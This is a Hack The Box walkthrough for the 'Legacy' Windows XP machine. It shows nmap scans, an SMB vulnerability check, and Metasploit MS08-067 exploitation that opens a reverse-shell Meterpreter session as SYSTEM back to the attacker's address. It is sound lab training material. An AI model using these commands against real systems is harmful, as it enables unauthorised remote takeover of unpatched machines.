---
clayout: ctf
title: Legacy
date: 2025-08-24
image: /ctf/hack-the-box/machines/legacy/info-card.png
type: Hack The Box

ctf:
    - name: Legacy
      link: https://app.hackthebox.com/machines/2
      thumbnail: /ctf/hack-the-box/machines/legacy/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/2
          thumbnail: /ctf/hack-the-box/machines/legacy/pwned.png
---

## Machine Overview

**Legacy** is a relatively simple, beginner‑level Hack The Box machine. It showcases the security risks associated with SMB on Windows, especially on older, unsupported systems. Only a single, publicly known exploit is required to achieve **administrator-level access**.

## Enumeration

### Nmap

We begin by scanning the machine for open ports and services:

```bash
nmap -A -oN nmap.txt 10.10.10.4
```

**Scan Results:**

```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

::: info Observation
The machine exposes MSRPC and SMB services. Given the target OS is Windows XP, this strongly hints at known SMB-related vulnerabilities.
:::

### Vulnerability Scan

We extend our scan with the `smb-vuln*` NSE scripts:

```bash
nmap --script="smb-vuln*" -p 445 10.10.10.4
```

**Scan Results:**

- **MS17-010 (EternalBlue) – CVE-2017-0143**
  Remote Code Execution in SMBv1.

- **MS08-067 – CVE-2008-4250**
  Remote Code Execution in the Windows Server service.

## Exploitation

We use Metasploit's MS08-067 module to exploit the system:

```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
> set LHOST 10.10.14.12
> set RHOST 10.10.10.4
> run
```

**Successful exploitation:**

```bash
[*] Started reverse TCP handler on 10.10.14.12:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.10.10.4:1039) at 2025-08-24 10:19:12 +0200

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

::: info Result
We now have a SYSTEM-level Meterpreter session, which provides **full administrative privileges**.
:::

On Windows XP, the `whoami` command is not available. Instead, in Meterpreter, the `getuid` command confirms the current user context.

::: info User & Root Flags

- User: `C:\Documents and Settings\john\Desktop\user.txt`
- Root: `C:\Documents and Settings\Administrator\Desktop\root.txt`
:::
